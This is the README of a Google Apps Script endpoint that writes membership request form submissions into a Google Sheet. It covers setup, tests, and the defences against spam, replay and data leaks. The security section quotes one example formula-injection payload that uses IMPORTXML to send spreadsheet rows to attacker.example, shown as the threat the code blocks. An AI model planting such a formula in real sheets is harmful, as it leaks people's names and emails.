# Request form → Google Sheets

The backend for the "Cere Accesul În Lojă" form. A Google Apps Script web app
receives each request and appends one row to the **Invitations** tab of a
spreadsheet.

```
index.html  ──POST JSON──▶  Apps Script web app  ──▶  Spreadsheet
(assets/js/app.js)              Code.gs                  "Invitations" tab
```

| File | What it does |
| --- | --- |
| `Code.gs` | The whole endpoint, in five sections: limits and keys · tokens and rate limiting · input validation · the sheet · the two web-app routes. |
| `appsscript.json` | Manifest — pins the runtime, the single OAuth scope and the web-app access. |
| `test/` | Runs `Code.gs` under Node against stubbed Google services. |

One file, because Apps Script concatenates every `.gs` in a project into a
single global scope anyway — splitting it buys nothing at runtime and costs a
second thing to keep in sync.

## Setup

1. **Create the spreadsheet.** Nothing to set up inside it: the script looks for
   a tab named `Invitations` and creates it, first in the tab order, if it is
   not there. The header row is written on the first run. If you would rather
   the tab were called something else, change `SHEET_NAME` at the top of
   section 4 and rename the tab to match — the script finds it by name, so the
   two have to agree.

2. **Open the bound editor** from that spreadsheet: **Extensions ▸ Apps Script**.
   Bound, not standalone: it is what keeps the OAuth scope down to
   `spreadsheets.currentonly`, so the script can reach this one file and nothing
   else in your Drive.

3. **Paste `Code.gs`** over the empty `Code.gs` the editor starts with. Then
   **Project Settings ▸ Show "appsscript.json"**, and paste the manifest over
   the default.

4. **Run `setup()` once** from the editor (pick it in the function dropdown ▸
   Run). It generates the signing key, writes the header row, and gets the
   OAuth consent screen out of the way — the consent prompt must happen here,
   not on a visitor's first submit. Google will warn that the app is unverified;
   that is expected for a script you own, choose **Advanced ▸ Go to …**.

5. **Deploy ▸ New deployment ▸ Web app**
   - Execute as: **Me**
   - Who has access: **Anyone**

   Both are required. "Anyone" is what lets a visitor who is not signed in to
   Google reach the form; "Execute as: Me" is what lets that anonymous request
   write to a spreadsheet only you can open. The visitor never touches your
   Drive — this script does, on their behalf, through the two routes in
   `Code.gs`. There is no read route, so the endpoint cannot be used to pull
   the list back out.

6. **Copy the `/exec` URL** into `assets/js/app.js`:

   ```js
   var ENDPOINT = 'https://script.google.com/macros/s/AKfy…/exec';
   ```

   Left empty, the form falls back to its local demo behaviour and stores
   nothing — which is also the fastest way to check whether a problem is in
   the page or in the backend.

7. **Run `selfTest()`** once from the editor. It fires four formula-injection
   payloads at the validator, then writes one dummy row. Open the sheet, confirm
   the row is there, and delete it.

Re-deploying after an edit: **Deploy ▸ Manage deployments ▸ ✎ ▸ Version: New**.
Editing the code alone changes nothing at the live URL — a very easy hour to
lose. The URL itself is stable across new versions of the same deployment.

## Tests

```sh
node apps-script/test/test.js      # 61 checks, no dependencies
```

`test/harness.js` loads `Code.gs` into a VM context with stubbed
`PropertiesService`, `CacheService`, `LockService`, `Utilities` and
`SpreadsheetApp`, so the real code runs unmodified. The sheet stub throws if a
value reaches a cell in a form Sheets would evaluate, which is what makes the
injection cases meaningful rather than decorative. Everything below in "What is
actually defended" has a test.

## The sheet

The `Invitations` tab, one row per request:

`Received At · Full Name · Email · Signature · Signed On · Request ID · Source · Status`

`Status` starts at `Nou` and is yours to work in — the script only ever appends,
it never reads or rewrites an existing row, so nothing you type in the sheet can
be clobbered by a submit. Other tabs in the same file are never touched; looking
the tab up by name rather than by position means reordering the tabs cannot
redirect submissions somewhere else.

## What is actually defended, and what isn't

Everything the page checks, the server checks again from the raw request body.
The page's copy of the rules exists to save a visitor a round trip on a typo.

**Formula injection into the sheet** — the one that matters here. A field like
`=IMPORTXML("https://attacker.example/?d="&A2,"//x")` is a live formula the
moment it lands in a cell, and it will happily send every row above it to
whoever typed it. Two things stop it: every user value is written with a leading
apostrophe (Sheets' literal-text marker — stored, not displayed, and
`getValue()` returns the original), and the name fields reject anything that
isn't a letter, a space, or name punctuation. `setValues()` on an explicit range
rather than `appendRow()`, which re-parses its arguments as if typed.

**Replay and drive-by posting.** Apps Script cannot read request headers, so
there is no Origin check to make and a classic CSRF token has nothing to bind
to. Instead a submit must carry a token issued by a prior `GET`, HMAC-signed,
valid between 1.2 seconds and 30 minutes old, and burned on first use. It stops
replayed requests and naive automation. It is not authentication.

**Flooding.** One submit per address per 15 minutes, five per 6 hours, 120 per
hour across the whole endpoint. Apps Script exposes no client IP, so the
per-address key is a hash of the email — the cache is not a place for personal
data.

**Enumeration.** A repeat address gets the same success response a new one does.
Answering "that address already applied" would turn the form into a
membership-checking oracle, and a member who submits twice should not see an
error either way.

**Bots.** The hidden `company` field is checked server-side as well as in the
page; a filled one gets a success response and no row.

**Leaks.** Responses are a fixed shape carrying a short code — never a message
built from user input, never an exception. Failures land in the Apps Script
console (Executions), where only you can read them.

Not defended, and worth being clear about: the endpoint is public by design.
Anyone who reads `app.js` has the URL and can post a plausible-looking request
that passes every check. **Treat every row as unverified until a human confirms
it.** If that ever stops being acceptable, the next step is a CAPTCHA
(Turnstile or reCAPTCHA v3) verified inside `doPost` — the token plumbing in
section 2 is where it would go.

## Data protection

The sheet holds names and email addresses given under the consent line in the
form, which points at a privacy policy and terms — both are `href="#"` in
`index.html` today and need real pages before this collects anything from real
people. Access to the spreadsheet is access to the whole membership list: keep
the share list short, and prefer "Restricted" over "anyone with the link".
